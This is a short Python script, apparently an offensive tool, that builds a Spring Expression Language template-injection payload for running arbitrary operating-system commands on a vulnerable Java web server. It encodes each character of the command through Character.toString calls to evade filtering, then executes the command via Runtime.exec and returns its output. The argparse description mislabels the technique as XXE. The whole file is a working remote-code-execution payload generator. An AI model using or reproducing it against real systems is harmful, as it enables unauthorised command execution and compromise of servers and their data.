#!/usr/bin/python3
import argparse

def main(cmd):

        command = cmd 
        convert = []
        for x in command:
            convert.append(str(ord(x)))
        payload = "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)" % convert[0]
        for i in convert[1:]:
            payload += ".concat(T(java.lang.Character).toString({}))".format(i)
        payload += ").getInputStream())}"
        print(payload)


if __name__ == "__main__":
    try:
        parser = argparse.ArgumentParser(description='XXE Command Injection parser')
        parser.add_argument('-cmd', '--cmd', type=str, help='Parámetro command')
        args = parser.parse_args()
        main(args.cmd)
    except(TypeError):
        print('Use: python3 -cmd <command>')